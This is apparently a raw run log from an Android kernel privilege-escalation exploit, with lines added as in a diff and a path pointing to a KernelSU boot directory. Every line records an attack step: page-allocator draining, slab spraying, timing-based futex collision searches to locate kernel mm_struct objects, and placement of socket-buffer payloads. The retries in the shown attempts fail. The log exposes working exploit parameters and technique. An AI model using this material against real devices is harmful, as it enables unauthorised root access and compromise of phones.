+[b24e39de8 23:25:31] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:25:31] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:25:31] [33m[*][t13553] [0mpayload nonce want=2619e7aa308697bd got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:25:31] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9421329070 len=8 fill=0 pos=7883678008957363548 page=92978c32f1bc2b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:31] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9421329070 len=8 fill=0 pos=7883678008957363548 page=92978c32f1bc2b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:31] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9421329070 len=8 fill=0 pos=7883678008957363548 page=92978c32f1bc2b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:31] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9421329100 len=8 fill=0 pos=7883678008957363548 page=92978c32f1bc2ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:31] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9421329100 len=8 fill=0 pos=7883678008957363548 page=92978c32f1bc2ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:31] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9421329100 len=8 fill=0 pos=7883678008957363548 page=92978c32f1bc2ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:31] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:25:31] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:25:31] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:25:31] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:25:31] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff9421328000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:25:31] [31m[-][t13553] [0mprepare_kernel_page retry 6/72
+[b24e39de8 23:25:31] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:25:33] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:25:33] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:25:33] [33m[*][t20856] [0mapprox_time=7 thr=70
+[b24e39de8 23:25:34] [33m[*][t20856] [0mstart finding collisisons
+[b24e39de8 23:25:34] [33m[*][t20856] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:25:34] [33m[*][t20856] [0mtarget_time=129 thr=70
+[b24e39de8 23:25:34] [33m[*][t20856] [0m  000000698750a3f0 i=126 t=14235/17717/17579
+[b24e39de8 23:25:35] [33m[*][t20856] [0m  0000006987650e20 i=452 t=15526/15852/17745
+[b24e39de8 23:25:36] [33m[*][t20856] [0m  0000006987d415a8 i=2229 t=17810/15966/16420
+[b24e39de8 23:25:37] [33m[*][t20856] [0m  000000698824ee10 i=3522 t=17746/17740/17588
+[b24e39de8 23:25:39] [33m[*][t20856] [0m  0000006988d39568 i=6317 t=17788/17792/14293
+[b24e39de8 23:25:39] [33m[*][t20856] [0mfound 5 collisisons
+[b24e39de8 23:25:39] [33m[*][t20856] [0mpost-pile baseline=21 target=21 count=5
+[b24e39de8 23:25:39] [33m[*][t20856] [0mpost-pile[1] 000000698750a3f0 t=20
+[b24e39de8 23:25:39] [33m[*][t20856] [0mpost-pile[2] 0000006987650e20 t=20
+[b24e39de8 23:25:39] [33m[*][t20856] [0mpost-pile[3] 0000006987d415a8 t=21
+[b24e39de8 23:25:39] [33m[*][t20856] [0mpost-pile[4] 000000698824ee10 t=21
+[b24e39de8 23:25:39] [33m[*][t20856] [0mpost-pile[5] 0000006988d39568 t=21
+[b24e39de8 23:25:39] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:25:39] [33m[*][t25006] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:25:39] [33m[*][t25007] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:25:39] [33m[*][t25005] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:25:39] [33m[*][t25009] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:25:39] [33m[*][t25011] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:25:39] [33m[*][t25012] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:25:39] [33m[*][t25008] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:25:39] [33m[*][t25010] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:25:39] [33m[*][t25012] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=0
+[b24e39de8 23:25:39] [33m[*][t25005] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=0
+[b24e39de8 23:25:39] [33m[*][t25009] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=0
+[b24e39de8 23:25:40] [33m[*][t25010] [0mfound mm_struct ffffff943d8a0780
+[b24e39de8 23:25:40] [33m[*][t25008] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:25:40] [33m[*][t25011] [0m[  6] scan done coarse=ffffff9500000000 end=ffffff9500000000 found=1
+[b24e39de8 23:25:40] [33m[*][t25006] [0m[  1] scan done coarse=ffffff92c0000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:25:40] [33m[*][t25007] [0m[  2] scan done coarse=ffffff9340000000 end=ffffff9340000000 found=1
+[b24e39de8 23:25:40] [33m[*][t25010] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:25:40] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff943d8a0000 phys_probe=0xffffff91e2bd1d38 delta=10113311432 (9.4GB)
+[b24e39de8 23:25:40] [33m[*][t13553] [0mprepare_skb_payload base=ffffff943d8a0000 delta=0 payload_base=ffffff943d8a0000
+[b24e39de8 23:25:40] [33m[*][t13553] [0mskbdelta wrote pb=ffffff943d8a0000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:25:40] [33m[*][t13553] [0mpayload nonce 1451505308697ae at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:25:40] [33m[*][t13553] [0mdone
+[b24e39de8 23:25:40] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:25:40] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:25:40] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:40] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:40] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=3135648 k=[-2,4]
+[b24e39de8 23:25:40] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:25:40] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:25:40] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:25:40] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:25:41] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:25:41] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:25:41] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:25:41] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:25:41] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:25:41] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:41] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:25:41] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:25:41] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:41] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3135648 k=[-2,4] k_fixed=-1
+[b24e39de8 23:25:41] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:25:42] [33m[*][t13553] [0mfix36 phase1 tp ctrl=532 ord3=502 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:25:42] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:25:42] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:25:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:25:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:25:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:25:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:25:43] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:25:43] [33m[*][t13553] [0mfix40 free HIT pfn=3397792 k=1 hits=1
+[b24e39de8 23:25:43] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:25:43] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:25:43] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff943d8a1100 errno=22
+[b24e39de8 23:25:43] [31m[-][t13553] [0mwatchpoint open open addr=ffffff943d8a1070 errno=22
+[b24e39de8 23:25:43] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff943d8a7f00 errno=22
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:25:43] [33m[*][t25022] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3135648 k=[-2,4] k_fixed=-1
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t25022] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:25:43] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=897
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:25:43] [33m[*][t13553] [0mfix36 phase2 tp ctrl=904 ord3=897 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff943d8a2238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:25:43] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 38[b24e39de8 23:25:43] [33m[*][t13553] [0m 2f[b24e39de8 23:25:43] [33m[*][t13553] [0m de[b24e39de8 23:25:43] [33m[*][t13553] [0m 6a[b24e39de8 23:25:43] [33m[*][t13553] [0m d3[b24e39de8 23:25:43] [33m[*][t13553] [0m ff[b24e39de8 23:25:43] [33m[*][t13553] [0m ff[b24e39de8 23:25:43] [33m[*][t13553] [0m ff[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m 00[b24e39de8 23:25:43] [33m[*][t13553] [0m
+[b24e39de8 23:25:43] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:25:43] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:25:43] [33m[*][t13553] [0mpayload nonce want=1451505308697ae got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d8a1070 len=8 fill=0 pos=7883678008957363548 page=92978c330e13ab14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d8a1070 len=8 fill=0 pos=7883678008957363548 page=92978c330e13ab14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d8a1070 len=8 fill=0 pos=7883678008957363548 page=92978c330e13ab14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d8a1100 len=8 fill=0 pos=7883678008957363548 page=92978c330e13aba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d8a1100 len=8 fill=0 pos=7883678008957363548 page=92978c330e13aba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d8a1100 len=8 fill=0 pos=7883678008957363548 page=92978c330e13aba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:43] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:25:43] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:25:43] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:25:43] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:25:43] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff943d8a0000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:25:43] [31m[-][t13553] [0mprepare_kernel_page retry 7/72
+[b24e39de8 23:25:43] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:25:46] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:25:46] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:25:46] [33m[*][t26364] [0mapprox_time=6 thr=60
+[b24e39de8 23:25:46] [33m[*][t26364] [0mstart finding collisisons
+[b24e39de8 23:25:46] [33m[*][t26364] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:25:46] [33m[*][t26364] [0mtarget_time=135 thr=60
+[b24e39de8 23:25:48] [33m[*][t26364] [0m  0000006988284fc0 i=3576 t=14547/17593/17593
+[b24e39de8 23:25:49] [33m[*][t26364] [0m  00000069887666d0 i=4826 t=17444/17553/17601
+[b24e39de8 23:25:51] [33m[*][t26364] [0m  0000006989032d30 i=7078 t=17438/17595/17489
+[b24e39de8 23:25:51] [33m[*][t26364] [0m  000000698921cc80 i=7568 t=17451/17603/17567
+[b24e39de8 23:25:52] [33m[*][t26364] [0m  000000698941cc80 i=8080 t=17627/17424/17595
+[b24e39de8 23:25:52] [33m[*][t26364] [0mfound 5 collisisons
+[b24e39de8 23:25:52] [33m[*][t26364] [0mpost-pile baseline=21 target=24 count=5
+[b24e39de8 23:25:52] [33m[*][t26364] [0mpost-pile[1] 0000006988284fc0 t=24
+[b24e39de8 23:25:52] [33m[*][t26364] [0mpost-pile[2] 00000069887666d0 t=13
+[b24e39de8 23:25:52] [33m[*][t26364] [0mpost-pile[3] 0000006989032d30 t=13
+[b24e39de8 23:25:52] [33m[*][t26364] [0mpost-pile[4] 000000698921cc80 t=13
+[b24e39de8 23:25:52] [33m[*][t26364] [0mpost-pile[5] 000000698941cc80 t=13
+[b24e39de8 23:25:52] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:25:52] [33m[*][t30519] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:25:52] [33m[*][t30523] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:25:52] [33m[*][t30525] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:25:52] [33m[*][t30522] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:25:52] [33m[*][t30526] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:25:52] [33m[*][t30521] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:25:52] [33m[*][t30524] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:25:52] [33m[*][t30520] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:25:52] [33m[*][t30524] [0mfound mm_struct ffffff93ca7cc380
+[b24e39de8 23:25:52] [33m[*][t30524] [0m[  5] scan done coarse=ffffff9400000000 end=ffffff9480000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30521] [0m[  2] scan done coarse=ffffff92c0000000 end=ffffff9340000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30525] [0m[  6] scan done coarse=ffffff9480000000 end=ffffff9500000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30522] [0m[  3] scan done coarse=ffffff9340000000 end=ffffff9380000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30520] [0m[  1] scan done coarse=ffffff9240000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30526] [0m[  7] scan done coarse=ffffff9500000000 end=ffffff9540000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30519] [0m[  0] scan done coarse=ffffff9200000000 end=ffffff9240000000 found=1
+[b24e39de8 23:25:52] [33m[*][t30523] [0m[  4] scan done coarse=ffffff93c0000000 end=ffffff9400000000 found=1
+[b24e39de8 23:25:52] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff93ca7c8000 phys_probe=0xffffff91e2bd1d38 delta=8183046856 (7.6GB)
+[b24e39de8 23:25:52] [33m[*][t13553] [0mprepare_skb_payload base=ffffff93ca7c8000 delta=0 payload_base=ffffff93ca7c8000
+[b24e39de8 23:25:52] [33m[*][t13553] [0mskbdelta wrote pb=ffffff93ca7c8000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:25:52] [33m[*][t13553] [0mpayload nonce 39791b7a3086945a at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:25:52] [33m[*][t13553] [0mdone
+[b24e39de8 23:25:52] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:25:52] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:25:52] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:52] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:52] [33m[*][t13553] [0mfix40 free-arm n=8 est_pfn=2664392 k=[-2,5]
+[b24e39de8 23:25:53] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:25:53] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:25:53] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:25:53] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:25:53] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:25:54] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:25:54] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:25:54] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:25:54] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:25:54] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:54] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:25:54] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:25:54] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:54] [33m[*][t13553] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2664392 k=[-2,5] k_fixed=-1
+[b24e39de8 23:25:54] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:25:54] [33m[*][t13553] [0mfix36 phase1 tp ctrl=526 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:25:54] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:25:55] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:25:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:25:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:25:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:25:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:25:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:25:56] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:25:56] [33m[*][t13553] [0mfix40 free HIT pfn=2926536 k=1 hits=1
+[b24e39de8 23:25:56] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:25:56] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:25:56] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff93ca7c9100 errno=22
+[b24e39de8 23:25:56] [31m[-][t13553] [0mwatchpoint open open addr=ffffff93ca7c9070 errno=22
+[b24e39de8 23:25:56] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff93ca7cff00 errno=22
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:25:56] [33m[*][t30536] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2664392 k=[-2,5] k_fixed=-1
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t30536] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:25:56] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=898
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:25:56] [33m[*][t13553] [0mfix36 phase2 tp ctrl=904 ord3=898 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff93ca7ca238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:25:56] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 38[b24e39de8 23:25:56] [33m[*][t13553] [0m 2f[b24e39de8 23:25:56] [33m[*][t13553] [0m de[b24e39de8 23:25:56] [33m[*][t13553] [0m 6a[b24e39de8 23:25:56] [33m[*][t13553] [0m d3[b24e39de8 23:25:56] [33m[*][t13553] [0m ff[b24e39de8 23:25:56] [33m[*][t13553] [0m ff[b24e39de8 23:25:56] [33m[*][t13553] [0m ff[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m 00[b24e39de8 23:25:56] [33m[*][t13553] [0m
+[b24e39de8 23:25:56] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
